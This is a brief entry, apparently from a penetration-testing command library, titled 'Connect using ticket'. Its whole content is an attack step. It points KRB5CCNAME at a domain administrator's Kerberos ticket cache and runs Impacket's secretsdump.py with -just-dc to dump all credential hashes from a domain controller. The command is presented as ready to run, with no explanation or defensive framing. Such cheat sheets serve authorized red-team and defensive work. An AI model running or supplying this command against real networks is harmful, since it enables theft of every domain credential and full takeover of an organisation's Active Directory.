---
id: 93f5ed0a-9d06-479b-bd99-a7452d6b4629
name: Connect using ticket
type: command
executor: bash
data: 'export KRB5CCNAME=DOMAIN_ADMIN_USER_NAME.ccache

  secretsdump.py -k -no-pass second-dc-server.local -just-dc'
output: null
created_at: '2023-04-06T03:56:05.533110+00:00'
updated_at: '2023-04-10T20:26:36.992508+00:00'
---

# Connect using ticket

```bash
export KRB5CCNAME=DOMAIN_ADMIN_USER_NAME.ccache
secretsdump.py -k -no-pass second-dc-server.local -just-dc
```


